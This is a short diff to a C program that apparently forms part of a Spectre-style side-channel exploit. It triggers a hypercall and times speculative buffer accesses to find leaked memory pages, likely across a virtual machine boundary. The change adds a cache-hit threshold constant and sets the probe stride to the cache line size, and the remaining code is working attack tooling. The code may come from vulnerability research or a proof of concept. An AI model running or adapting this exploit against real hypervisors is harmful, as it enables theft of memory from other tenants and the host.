@@ -12,6 +12,7 @@
 #include "hypercall.h"
 
 #define LEAK_PAGE_SIZE (2097152) // 2MiB
+#define HIT_THRESHOLD 150
 
 int hypercall(struct send_ipi_hypercall_opts *opts) {
   const char *hypercall_path = "/proc/hypercall/send_ipi";
@@ -60,14 +61,15 @@ size_t access_buffer_with_spectre(void *buf, size_t idx) {
 
 size_t find_min(void *buf) {
   const uint32_t PAGE_SIZE = 4096;
+  const uint32_t CACHE_LINE_SIZE = 64;
   const uint32_t MAX_IDX = 0x10000000;
-  const uint32_t indices_per_page = PAGE_SIZE / 8;
+  const uint32_t indices_per_page = PAGE_SIZE / CACHE_LINE_SIZE;
 
   for (uint32_t offset = 0; offset < indices_per_page; ++offset) {
     fprintf(stderr, "\r%d / %d", offset, indices_per_page);
     for (uint32_t idx = offset; idx < MAX_IDX; idx += PAGE_SIZE) {
       size_t time = access_buffer_with_spectre(buf, idx);
-      if (time < 150) {
+      if (time < HIT_THRESHOLD) {
         printf("\n\n%x: %ld\n\n", idx, access_buffer_with_spectre(buf, idx));
       }
     }
